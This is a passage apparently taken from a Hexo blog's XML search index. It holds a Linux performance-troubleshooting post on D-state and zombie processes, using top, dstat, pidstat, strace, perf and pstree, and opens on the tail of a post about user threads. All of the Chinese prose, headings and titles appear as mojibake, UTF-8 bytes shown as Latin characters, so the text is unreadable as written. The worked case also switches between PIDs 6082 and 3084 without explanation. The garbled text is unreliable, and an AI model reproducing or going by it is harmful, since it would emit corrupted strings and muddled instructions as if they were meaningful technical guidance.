</li><li>åŒä¸€è¿›ç¨‹ä¸­åªèƒ½åŒæ—¶æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿è¡Œï¼Œå¦‚æœæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨äº†ç³»ç»Ÿè°ƒç”¨è€Œé˜»å¡ï¼Œé‚£ä¹ˆæ•´ä¸ªè¿›ç¨‹éƒ½ä¼šè¢«æŒ‚èµ·ã€‚<h3 id="ç”¨æˆ·çº¿ç¨‹çš„ç¼ºç‚¹"><a href="#ç”¨æˆ·çº¿ç¨‹çš„ç¼ºç‚¹" class="headerlink" title="ç”¨æˆ·çº¿ç¨‹çš„ç¼ºç‚¹"></a>ç”¨æˆ·çº¿ç¨‹çš„ç¼ºç‚¹</h3>åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„çº¿ç¨‹åªèƒ½åœ¨åŒä¸€ä¸ªå¤„ç†å™¨ä¸‹åˆ†æ—¶å¤ç”¨ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç³»ç»Ÿä¸­å‡ºç°å¤§é‡ä¸å¯ä¸­æ–­è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹æ€ä¹ˆåŠ</title>
      <link href="/2022/06/25/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/"/>
      <url>/2022/06/25/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="è¿›ç¨‹çŠ¶æ€"><a href="#è¿›ç¨‹çŠ¶æ€" class="headerlink" title="è¿›ç¨‹çŠ¶æ€"></a>è¿›ç¨‹çŠ¶æ€</h2><p>å½“ iowait å‡é«˜æ—¶ï¼Œè¿›ç¨‹å¾ˆå¯èƒ½å› ä¸ºå¾—ä¸åˆ°ç¡¬ä»¶çš„å“åº”ï¼Œè€Œé•¿æ—¶é—´å¤„äºä¸å¯ä¸­æ–­çŠ¶æ€ã€‚ä» ps æˆ–è€… top å‘½ä»¤çš„è¾“å‡ºä¸­ï¼Œä½ å¯ä»¥å‘ç°å®ƒä»¬éƒ½å¤„äº D çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯ä¸å¯ä¸­æ–­çŠ¶æ€ï¼ˆUninterruptible Sleepï¼‰ã€‚<br>é€šè¿‡topæŸ¥çœ‹è¿›ç¨‹çŠ¶æ€ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/0.png"></p><ul><li><strong>R</strong> æ˜¯ Running æˆ– Runnable çš„ç¼©å†™ï¼Œè¡¨ç¤ºè¿›ç¨‹åœ¨ CPU çš„å°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œæ­£åœ¨è¿è¡Œæˆ–è€…æ­£åœ¨ç­‰å¾…è¿è¡Œã€‚</li><li><strong>D</strong> æ˜¯ Disk Sleep çš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯ä¸å¯ä¸­æ–­çŠ¶æ€ç¡çœ ï¼ˆUninterruptible Sleepï¼‰ï¼Œä¸€èˆ¬è¡¨ç¤ºè¿›ç¨‹æ­£åœ¨è·Ÿç¡¬ä»¶äº¤äº’ï¼Œå¹¶ä¸”äº¤äº’è¿‡ç¨‹ä¸å…è®¸è¢«å…¶ä»–è¿›ç¨‹æˆ–ä¸­æ–­æ‰“æ–­ã€‚</li><li><strong>Z</strong> æ˜¯ Zombie çš„ç¼©å†™ï¼Œè¡¨ç¤ºåƒµå°¸è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¿›ç¨‹å®é™…ä¸Šå·²ç»ç»“æŸäº†ï¼Œä½†æ˜¯çˆ¶è¿›ç¨‹è¿˜æ²¡æœ‰å›æ”¶å®ƒçš„èµ„æºï¼ˆæ¯”å¦‚è¿›ç¨‹çš„æè¿°ç¬¦ã€PID ç­‰ï¼‰ã€‚</li><li><strong>S</strong> æ˜¯ Interruptible Sleep çš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯å¯ä¸­æ–­çŠ¶æ€ç¡çœ ï¼Œè¡¨ç¤ºè¿›ç¨‹å› ä¸ºç­‰å¾…æŸä¸ªäº‹ä»¶è€Œè¢«ç³»ç»ŸæŒ‚èµ·ã€‚å½“è¿›ç¨‹ç­‰å¾…çš„äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå®ƒä¼šè¢«å”¤é†’å¹¶è¿›å…¥ R çŠ¶æ€ã€‚</li><li><strong>I</strong> æ˜¯ Idle çš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯ç©ºé—²çŠ¶æ€ï¼Œç”¨åœ¨ä¸å¯ä¸­æ–­ç¡çœ çš„å†…æ ¸çº¿ç¨‹ä¸Šã€‚å‰é¢è¯´äº†ï¼Œç¡¬ä»¶äº¤äº’å¯¼è‡´çš„ä¸å¯ä¸­æ–­è¿›ç¨‹ç”¨ D è¡¨ç¤ºï¼Œä½†å¯¹æŸäº›å†…æ ¸çº¿ç¨‹æ¥è¯´ï¼Œå®ƒä»¬æœ‰å¯èƒ½å®é™…ä¸Šå¹¶æ²¡æœ‰ä»»ä½•è´Ÿè½½ï¼Œç”¨ Idle æ­£æ˜¯ä¸ºäº†åŒºåˆ†è¿™ç§æƒ…å†µã€‚è¦æ³¨æ„ï¼ŒD çŠ¶æ€çš„è¿›ç¨‹ä¼šå¯¼è‡´å¹³å‡è´Ÿè½½å‡é«˜ï¼Œ I çŠ¶æ€çš„è¿›ç¨‹å´ä¸ä¼šã€‚</li><li><strong>T</strong>æ˜¯Stopped æˆ– Traced çš„ç¼©å†™ï¼Œè¡¨ç¤ºè¿›ç¨‹å¤„äºæš‚åœæˆ–è€…è·Ÿè¸ªçŠ¶æ€ã€‚</li><li><strong>X</strong>æ˜¯Dead çš„ç¼©å†™ï¼Œè¡¨ç¤ºè¿›ç¨‹å·²ç»æ¶ˆäº¡ï¼Œæ‰€ä»¥ä¸ä¼šåœ¨ top æˆ–è€… ps å‘½ä»¤ä¸­çœ‹åˆ°å®ƒã€‚</li></ul><h3 id="ä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸å¯ä¸­æ–­çŠ¶æ€"><a href="#ä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸å¯ä¸­æ–­çŠ¶æ€" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸å¯ä¸­æ–­çŠ¶æ€"></a>ä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸å¯ä¸­æ–­çŠ¶æ€</h3><p>æ˜¯ä¸ºäº†ä¿è¯è¿›ç¨‹æ•°æ®ä¸ç¡¬ä»¶çŠ¶æ€ä¸€è‡´ï¼Œå¹¶ä¸”æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸å¯ä¸­æ–­çŠ¶æ€åœ¨å¾ˆçŸ­æ—¶é—´å†…å°±ä¼šç»“æŸã€‚æ‰€ä»¥ï¼ŒçŸ­æ—¶çš„ä¸å¯ä¸­æ–­çŠ¶æ€è¿›ç¨‹ï¼Œæˆ‘ä»¬ä¸€èˆ¬å¯ä»¥å¿½ç•¥ã€‚<br>ä½†å¦‚æœç³»ç»Ÿæˆ–ç¡¬ä»¶å‘ç”Ÿäº†æ•…éšœï¼Œè¿›ç¨‹å¯èƒ½ä¼šåœ¨ä¸å¯ä¸­æ–­çŠ¶æ€ä¿æŒå¾ˆä¹…ï¼Œç”šè‡³å¯¼è‡´ç³»ç»Ÿä¸­å‡ºç°å¤§é‡ä¸å¯ä¸­æ–­è¿›ç¨‹ã€‚è¿™æ—¶ï¼Œä½ å°±å¾—æ³¨æ„ä¸‹ï¼Œç³»ç»Ÿæ˜¯ä¸æ˜¯å‡ºç°äº† I/O ç­‰æ€§èƒ½é—®é¢˜ã€‚</p><h3 id="ä¸ºä»€ä¹ˆä¼šå‡ºç°åƒµå°¸è¿›ç¨‹"><a href="#ä¸ºä»€ä¹ˆä¼šå‡ºç°åƒµå°¸è¿›ç¨‹" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šå‡ºç°åƒµå°¸è¿›ç¨‹"></a>ä¸ºä»€ä¹ˆä¼šå‡ºç°åƒµå°¸è¿›ç¨‹</h3><p>å½“ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºäº†å­è¿›ç¨‹åï¼Œå®ƒåº”è¯¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ wait() æˆ–è€… waitpid() ç­‰å¾…å­è¿›ç¨‹ç»“æŸï¼Œå›æ”¶å­è¿›ç¨‹çš„èµ„æºï¼›è€Œå­è¿›ç¨‹åœ¨ç»“æŸæ—¶ï¼Œä¼šå‘å®ƒçš„çˆ¶è¿›ç¨‹å‘é€ SIGCHLD ä¿¡å·ï¼Œæ‰€ä»¥ï¼Œçˆ¶è¿›ç¨‹è¿˜å¯ä»¥æ³¨å†Œ SIGCHLD ä¿¡å·çš„å¤„ç†å‡½æ•°ï¼Œå¼‚æ­¥å›æ”¶èµ„æºã€‚<br>å¦‚æœçˆ¶è¿›ç¨‹æ²¡è¿™ä¹ˆåšï¼Œæˆ–æ˜¯å­è¿›ç¨‹æ‰§è¡Œå¤ªå¿«ï¼Œçˆ¶è¿›ç¨‹è¿˜æ²¡æ¥å¾—åŠå¤„ç†å­è¿›ç¨‹çŠ¶æ€ï¼Œå­è¿›ç¨‹å°±å·²ç»æå‰é€€å‡ºï¼Œé‚£è¿™æ—¶çš„å­è¿›ç¨‹å°±ä¼šå˜æˆåƒµå°¸è¿›ç¨‹ã€‚<br>é€šå¸¸ï¼Œåƒµå°¸è¿›ç¨‹æŒç»­çš„æ—¶é—´éƒ½æ¯”è¾ƒçŸ­ï¼Œåœ¨çˆ¶è¿›ç¨‹å›æ”¶å®ƒçš„èµ„æºåå°±ä¼šæ¶ˆäº¡ï¼›æˆ–è€…åœ¨çˆ¶è¿›ç¨‹é€€å‡ºåï¼Œç”± init è¿›ç¨‹å›æ”¶åä¹Ÿä¼šæ¶ˆäº¡ã€‚<br>ä¸€æ—¦çˆ¶è¿›ç¨‹æ²¡æœ‰å¤„ç†å­è¿›ç¨‹çš„ç»ˆæ­¢ï¼Œè¿˜ä¸€ç›´ä¿æŒè¿è¡ŒçŠ¶æ€ï¼Œé‚£ä¹ˆå­è¿›ç¨‹å°±ä¼šä¸€ç›´å¤„äºåƒµå°¸çŠ¶æ€ã€‚å¤§é‡çš„åƒµå°¸è¿›ç¨‹ä¼šç”¨å°½ PID è¿›ç¨‹å·ï¼Œå¯¼è‡´æ–°è¿›ç¨‹ä¸èƒ½åˆ›å»ºï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µä¸€å®šè¦é¿å…ã€‚</p><h2 id="æ¡ˆä¾‹åˆ†æ"><a href="#æ¡ˆä¾‹åˆ†æ" class="headerlink" title="æ¡ˆä¾‹åˆ†æ"></a>æ¡ˆä¾‹åˆ†æ</h2><p>æ¡ˆä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¾“å…¥topï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/1.png"></p><h3 id="å‘ç°é—®é¢˜"><a href="#å‘ç°é—®é¢˜" class="headerlink" title="å‘ç°é—®é¢˜"></a>å‘ç°é—®é¢˜</h3><ul><li>å…ˆçœ‹ç¬¬ä¸€è¡Œçš„å¹³å‡è´Ÿè½½ï¼ˆ Load Averageï¼‰ï¼Œè¿‡å» 1 åˆ†é’Ÿã€5 åˆ†é’Ÿå’Œ 15 åˆ†é’Ÿå†…çš„å¹³å‡è´Ÿè½½åœ¨ä¾æ¬¡å‡å°ï¼Œè¯´æ˜å¹³å‡è´Ÿè½½æ­£åœ¨å‡é«˜ï¼›è€Œ 1 åˆ†é’Ÿå†…çš„å¹³å‡è´Ÿè½½å·²ç»è¾¾åˆ°ç³»ç»Ÿçš„ CPU ä¸ªæ•°ï¼Œè¯´æ˜ç³»ç»Ÿå¾ˆå¯èƒ½å·²ç»æœ‰äº†æ€§èƒ½ç“¶é¢ˆã€‚</li><li>å†çœ‹ç¬¬äºŒè¡Œçš„ Tasksï¼Œæœ‰ 1 ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œä½†åƒµå°¸è¿›ç¨‹æ¯”è¾ƒå¤šï¼Œè€Œä¸”è¿˜åœ¨ä¸åœå¢åŠ ï¼Œè¯´æ˜æœ‰å­è¿›ç¨‹åœ¨é€€å‡ºæ—¶æ²¡è¢«æ¸…ç†ã€‚</li><li>æ¥ä¸‹æ¥çœ‹ä¸¤ä¸ª CPU çš„ä½¿ç”¨ç‡æƒ…å†µï¼Œç”¨æˆ· CPU å’Œç³»ç»Ÿ CPU éƒ½ä¸é«˜ï¼Œä½† iowait åˆ†åˆ«æ˜¯ 60.5% å’Œ 94.6%ï¼Œå¥½åƒæœ‰ç‚¹å„¿ä¸æ­£å¸¸ã€‚</li><li>æœ€åå†çœ‹æ¯ä¸ªè¿›ç¨‹çš„æƒ…å†µï¼Œ CPU ä½¿ç”¨ç‡æœ€é«˜çš„è¿›ç¨‹åªæœ‰ 0.3%ï¼Œçœ‹èµ·æ¥å¹¶ä¸é«˜ï¼›ä½†æœ‰ä¸¤ä¸ªè¿›ç¨‹å¤„äº D çŠ¶æ€ï¼Œå®ƒä»¬å¯èƒ½åœ¨ç­‰å¾… I/Oï¼Œä½†å…‰å‡­è¿™é‡Œå¹¶ä¸èƒ½ç¡®å®šæ˜¯å®ƒä»¬å¯¼è‡´äº† iowait å‡é«˜ã€‚</li></ul><p>æˆ‘ä»¬æŠŠè¿™å››ä¸ªé—®é¢˜å†æ±‡æ€»ä¸€ä¸‹ï¼Œå°±å¯ä»¥å¾—åˆ°å¾ˆæ˜ç¡®çš„ä¸¤ç‚¹ï¼š</p><ul><li>ç¬¬ä¸€ç‚¹ï¼Œiowait å¤ªé«˜äº†ï¼Œå¯¼è‡´ç³»ç»Ÿçš„å¹³å‡è´Ÿè½½å‡é«˜ï¼Œç”šè‡³è¾¾åˆ°äº†ç³»ç»Ÿ CPU çš„ä¸ªæ•°ã€‚</li><li>ç¬¬äºŒç‚¹ï¼Œåƒµå°¸è¿›ç¨‹åœ¨ä¸æ–­å¢å¤šï¼Œè¯´æ˜æœ‰ç¨‹åºæ²¡èƒ½æ­£ç¡®æ¸…ç†å­è¿›ç¨‹çš„èµ„æºã€‚</li></ul><h3 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h3><p>å®‰è£…dstat<br><code>yum install -y dstat</code><br>dstatå¯ä»¥åŒæ—¶æŸ¥çœ‹ CPU å’Œ I/O è¿™ä¸¤ç§èµ„æºçš„ä½¿ç”¨æƒ…å†µï¼Œä¾¿äºå¯¹æ¯”åˆ†æã€‚<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/2.png"><br>ä» dstat çš„è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ¯å½“ iowait å‡é«˜ï¼ˆwaiï¼‰æ—¶ï¼Œç£ç›˜çš„è¯»è¯·æ±‚ï¼ˆreadï¼‰éƒ½ä¼šå¾ˆå¤§ã€‚è¿™è¯´æ˜ iowait çš„å‡é«˜è·Ÿç£ç›˜çš„è¯»è¯·æ±‚æœ‰å…³ï¼Œå¾ˆå¯èƒ½å°±æ˜¯ç£ç›˜è¯»å¯¼è‡´çš„ã€‚<br>è¿è¡Œ top å‘½ä»¤ï¼Œè§‚å¯Ÿ D çŠ¶æ€çš„è¿›ç¨‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/3.png"><br>æˆ‘ä»¬ä» top çš„è¾“å‡ºæ‰¾åˆ° D çŠ¶æ€è¿›ç¨‹çš„ PIDï¼Œä½ å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªç•Œé¢é‡Œæœ‰ä¸¤ä¸ª D çŠ¶æ€çš„è¿›ç¨‹ï¼ŒPID åˆ†åˆ«æ˜¯ 4344 å’Œ 4345ã€‚<br>ä¸€èˆ¬è¦æŸ¥çœ‹æŸä¸€ä¸ªè¿›ç¨‹çš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œéƒ½å¯ä»¥ç”¨æˆ‘ä»¬çš„è€æœ‹å‹ pidstatï¼Œä¸è¿‡è¿™æ¬¡è®°å¾—åŠ ä¸Š -d å‚æ•°ï¼Œä»¥ä¾¿è¾“å‡º I/O ä½¿ç”¨æƒ…å†µã€‚<br>æ¯”å¦‚ï¼Œä»¥ 4344 ä¸ºä¾‹ï¼Œæˆ‘ä»¬åœ¨ç»ˆç«¯é‡Œè¿è¡Œä¸‹é¢çš„ pidstat å‘½ä»¤ï¼Œå¹¶ç”¨ -p 4344 å‚æ•°æŒ‡å®šè¿›ç¨‹å·ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/4.png"><br> kB_rd è¡¨ç¤ºæ¯ç§’è¯»çš„ KB æ•°ï¼Œ kB_wr è¡¨ç¤ºæ¯ç§’å†™çš„ KB æ•°ï¼Œiodelay è¡¨ç¤º I/O çš„å»¶è¿Ÿï¼ˆå•ä½æ˜¯æ—¶é’Ÿå‘¨æœŸï¼‰ã€‚å®ƒä»¬éƒ½æ˜¯ 0ï¼Œé‚£å°±è¡¨ç¤ºæ­¤æ—¶æ²¡æœ‰ä»»ä½•çš„è¯»å†™ï¼Œè¯´æ˜é—®é¢˜ä¸æ˜¯ 4344 è¿›ç¨‹å¯¼è‡´çš„ã€‚<br>ç”¨åŒæ ·çš„æ–¹æ³•åˆ†æè¿›ç¨‹ 4345ï¼Œä½ ä¼šå‘ç°ï¼Œå®ƒä¹Ÿæ²¡æœ‰ä»»ä½•ç£ç›˜è¯»å†™ã€‚<br>ç»§ç»­ä½¿ç”¨ pidstatï¼Œä½†è¿™æ¬¡å»æ‰è¿›ç¨‹å·ï¼Œå¹²è„†å°±æ¥è§‚å¯Ÿæ‰€æœ‰è¿›ç¨‹çš„ I/O ä½¿ç”¨æƒ…å†µã€‚<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/5.png"></p><p>è¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦å›é¡¾ä¸€ä¸‹è¿›ç¨‹ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åŒºåˆ«ã€‚è¿›ç¨‹æƒ³è¦è®¿é—®ç£ç›˜ï¼Œå°±å¿…é¡»ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ï¼Œé‡ç‚¹å°±æ˜¯æ‰¾å‡º app è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨äº†ã€‚<br>strace æ­£æ˜¯æœ€å¸¸ç”¨çš„è·Ÿè¸ªè¿›ç¨‹ç³»ç»Ÿè°ƒç”¨çš„å·¥å…·ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä» pidstat çš„è¾“å‡ºä¸­æ‹¿åˆ°è¿›ç¨‹çš„ PID å·ï¼Œæ¯”å¦‚ 6082ï¼Œç„¶ååœ¨ç»ˆç«¯ä¸­è¿è¡Œ strace å‘½ä»¤ï¼Œå¹¶ç”¨ -p å‚æ•°æŒ‡å®š PID å·ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/6.png"><br>è¿™å„¿å‡ºç°äº†ä¸€ä¸ªå¥‡æ€ªçš„é”™è¯¯ï¼Œstrace å‘½ä»¤å±…ç„¶å¤±è´¥äº†ï¼Œå¹¶ä¸”å‘½ä»¤æŠ¥å‡ºçš„é”™è¯¯æ˜¯æ²¡æœ‰æƒé™ã€‚æŒ‰ç†æ¥è¯´ï¼Œæˆ‘ä»¬æ‰€æœ‰æ“ä½œéƒ½å·²ç»æ˜¯ä»¥ root ç”¨æˆ·è¿è¡Œäº†ï¼Œä¸ºä»€ä¹ˆè¿˜ä¼šæ²¡æœ‰æƒé™å‘¢ï¼Ÿ<br><strong>ä¸€èˆ¬é‡åˆ°è¿™ç§é—®é¢˜æ—¶ï¼Œå…ˆæ£€æŸ¥ä¸€ä¸‹è¿›ç¨‹çš„çŠ¶æ€æ˜¯å¦æ­£å¸¸</strong>ã€‚æ¯”å¦‚ï¼Œç»§ç»­åœ¨ç»ˆç«¯ä¸­è¿è¡Œ ps å‘½ä»¤ï¼Œå¹¶ä½¿ç”¨ grep æ‰¾å‡ºåˆšæ‰çš„ 6082 å·è¿›ç¨‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/7.png"><br>è¿›ç¨‹ 6082 å·²ç»å˜æˆäº† Z çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯åƒµå°¸è¿›ç¨‹ã€‚åƒµå°¸è¿›ç¨‹éƒ½æ˜¯å·²ç»é€€å‡ºçš„è¿›ç¨‹ï¼Œæ‰€ä»¥å°±æ²¡æ³•å„¿ç»§ç»­åˆ†æå®ƒçš„ç³»ç»Ÿè°ƒç”¨ã€‚å…³äºåƒµå°¸è¿›ç¨‹çš„å¤„ç†æ–¹æ³•ï¼Œæˆ‘ä»¬ä¸€ä¼šå„¿å†è¯´ï¼Œç°åœ¨è¿˜æ˜¯ç»§ç»­åˆ†æ iowait çš„é—®é¢˜ã€‚<br>topã€pidstat è¿™ç±»å·¥å…·å·²ç»ä¸èƒ½ç»™å‡ºæ›´å¤šçš„ä¿¡æ¯äº†ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å°±åº”è¯¥æ±‚åŠ©é‚£äº›åŸºäºäº‹ä»¶è®°å½•çš„åŠ¨æ€è¿½è¸ªå·¥å…·äº†ã€‚<br>åœ¨ç»ˆç«¯ä¸­è¿è¡Œ perf recordï¼ŒæŒç»­ä¸€ä¼šå„¿ï¼ˆä¾‹å¦‚ 15 ç§’ï¼‰ï¼Œç„¶åæŒ‰ Ctrl+C é€€å‡ºï¼Œå†è¿è¡Œ perf report æŸ¥çœ‹æŠ¥å‘Šï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/8.png"><br>æ‰¾åˆ°æˆ‘ä»¬å…³æ³¨çš„ app è¿›ç¨‹ï¼ŒæŒ‰å›è½¦é”®å±•å¼€è°ƒç”¨æ ˆï¼Œä½ å°±ä¼šå¾—åˆ°ä¸‹é¢è¿™å¼ è°ƒç”¨å…³ç³»å›¾ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/9.png"><br>app çš„ç¡®åœ¨é€šè¿‡ç³»ç»Ÿè°ƒç”¨ sys_read() è¯»å–æ•°æ®ã€‚å¹¶ä¸”ä» new_sync_read å’Œ blkdev_direct_IO èƒ½çœ‹å‡ºï¼Œè¿›ç¨‹æ­£åœ¨å¯¹ç£ç›˜è¿›è¡Œ<strong>ç›´æ¥è¯»</strong>ï¼Œä¹Ÿå°±æ˜¯ç»•è¿‡äº†ç³»ç»Ÿç¼“å­˜ï¼Œæ¯ä¸ªè¯»è¯·æ±‚éƒ½ä¼šä»ç£ç›˜ç›´æ¥è¯»ï¼Œè¿™å°±å¯ä»¥è§£é‡Šæˆ‘ä»¬è§‚å¯Ÿåˆ°çš„ iowait å‡é«˜äº†ã€‚<br>ä¹‹åå»æ£€æŸ¥æºç å¹¶ä¿®æ”¹å³å¯ã€‚<br>æ¥ä¸‹æ¥å¤„ç†åƒµå°¸è¿›ç¨‹çš„é—®é¢˜ã€‚æ—¢ç„¶åƒµå°¸è¿›ç¨‹æ˜¯å› ä¸ºçˆ¶è¿›ç¨‹æ²¡æœ‰å›æ”¶å­è¿›ç¨‹çš„èµ„æºè€Œå‡ºç°çš„ï¼Œé‚£ä¹ˆï¼Œè¦è§£å†³æ‰å®ƒä»¬ï¼Œå°±è¦æ‰¾åˆ°å®ƒä»¬çš„æ ¹å„¿ï¼Œ<strong>ä¹Ÿå°±æ˜¯æ‰¾å‡ºçˆ¶è¿›ç¨‹ï¼Œç„¶ååœ¨çˆ¶è¿›ç¨‹é‡Œè§£å†³ã€‚</strong><br>çˆ¶è¿›ç¨‹çš„æ‰¾æ³•æˆ‘ä»¬å‰é¢è®²è¿‡ï¼Œæœ€ç®€å•çš„å°±æ˜¯è¿è¡Œ pstree å‘½ä»¤ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%8F%AF%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E6%80%8E%E4%B9%88%E5%8A%9E/10.png"><br>è¿è¡Œå®Œï¼Œä½ ä¼šå‘ç° 3084 å·è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æ˜¯ 4009ï¼Œä¹Ÿå°±æ˜¯ app åº”ç”¨ã€‚<br>æ‰€ä»¥è¦æ¥ç€æŸ¥çœ‹ app åº”ç”¨ç¨‹åºçš„ä»£ç ï¼Œçœ‹çœ‹å­è¿›ç¨‹ç»“æŸçš„å¤„ç†æ˜¯å¦æ­£ç¡®ï¼Œæ¯”å¦‚æœ‰æ²¡æœ‰è°ƒç”¨ wait() æˆ– waitpid() ï¼ŒæŠ‘æˆ–æ˜¯ï¼Œæœ‰æ²¡æœ‰æ³¨å†Œ SIGCHLD ä¿¡å·çš„å¤„ç†å‡½æ•°ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" 